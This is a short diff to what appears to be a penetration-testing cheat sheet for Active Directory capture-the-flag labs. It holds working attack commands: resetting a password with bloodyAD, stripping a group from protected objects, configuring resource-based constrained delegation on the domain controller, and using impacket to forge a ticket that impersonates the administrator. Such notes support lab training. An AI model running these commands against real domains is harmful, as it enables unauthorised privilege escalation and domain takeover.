@@ -484,8 +484,8 @@ bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k set password 'DistinguishedName' 
 +---------- Remove Protected ----------+
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k remove groupMember 'CN=PROTECTED OBJECTS,CN=USERS,DC=RUSTYKEY,DC=HTB' 'CN=IT,CN=USERS,DC=RUSTYKEY,DC=HTB'
 
-+---------- AllowedToAct ----------+
-Set-ADComputer -PrincipalsAllowedToDelegateToAccount "OWNED_COMPUTER$" -Identity 'DC'
++---------- AddAllowedToAct / AllowedToAct ----------+
+Set-ADComputer -PrincipalsAllowedToDelegateToAccount "OWNED_COMPUTER$" -Identity 'DC_COMPUTER_NAME'
 export OWNED_COMPUTER='' # without $ sign
 impacket-getTGT -dc-ip $TARGET $DOM/"$OWNED_COMPUTER$":'$PASSWORD'; export KRB5CCNAME="$OWNED_COMPUTER$.ccache"
 impacket-getST -dc-ip $TARGET $DOM/"$OWNED_COMPUTER$" -k -no-pass -impersonate administrator -spn "cifs/$DC"; mv *administrator@*.ccache administrator.ccache
